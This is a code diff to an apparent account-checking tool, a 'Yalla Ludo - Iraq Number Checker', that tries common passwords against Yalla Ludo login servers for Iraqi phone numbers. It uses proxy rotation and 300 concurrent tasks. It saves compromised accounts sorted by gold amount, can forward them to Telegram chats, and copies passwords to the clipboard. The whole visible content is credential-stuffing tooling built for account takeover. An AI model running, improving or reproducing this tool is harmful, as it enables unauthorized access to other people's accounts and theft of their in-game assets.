@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Yalla Ludo - Iraq Number Checker
 # By @to_ls
 
 import base64
@@ -63,10 +66,10 @@ LOGIN_SERVERS = [
 BOT_TOKEN = ""
 CHAT_IDS = []
 MAX_RESULTS = 0
-PROXY_FILE = ""
+PROXY_FILE = "/storage/emulated/0/Download/proxyscrape_premium_http_proxies.txt"
 
 PASSWORDS_IQ = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]
-PHONE_PASSWORDS = ["077", "078", "079","075"]
+PHONE_PASSWORDS = ["077", "078", "079"]
 
 def _aes_cbc(key, iv, pt):
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -1039,7 +1042,6 @@ async def main_async():
     
     print("\n[+] Enter Configuration:")
     
-    # بروكسي - إدخال من المستخدم
     proxy_path = input("Proxy file path (press Enter to skip): ").strip()
     if proxy_path:
         proxy_manager = ProxyManager(proxy_path)
@@ -1047,13 +1049,10 @@ async def main_async():
         proxy_manager = ProxyManager()
         print("[!] Running without proxies")
     
-    # توكن البوت - إدخال من المستخدم
-    print("\n[+] Telegram Configuration:")
-    bot_token = input("Enter your Telegram Bot Token (press Enter to skip): ").strip()
-    BOT_TOKEN = bot_token
+    BOT_TOKEN = input("Telegram Bot Token (press Enter to skip): ").strip()
     
     if BOT_TOKEN:
-        chat_ids_input = input("Enter Telegram Chat IDs (comma separated, e.g., 123,456): ").strip()
+        chat_ids_input = input("Telegram Chat IDs (comma separated, e.g., 123,456): ").strip()
         if chat_ids_input:
             CHAT_IDS = [x.strip() for x in chat_ids_input.split(',') if x.strip()]
             print(f"[+] Will send to {len(CHAT_IDS)} recipients")
@@ -1066,9 +1065,7 @@ async def main_async():
     print("\n[+] Starting checker...\n")
     print("[+] Accounts will be saved in 'accounts_by_gold/' folder by gold amount")
     print("[+] Passwords will be copied to clipboard automatically\n")
-    print("[+] Using 300 concurrent tasks for maximum speed\n")
     
-    # عدد الخيوط ثابت 300
     concurrency = 300
     semaphore = asyncio.Semaphore(concurrency)
     
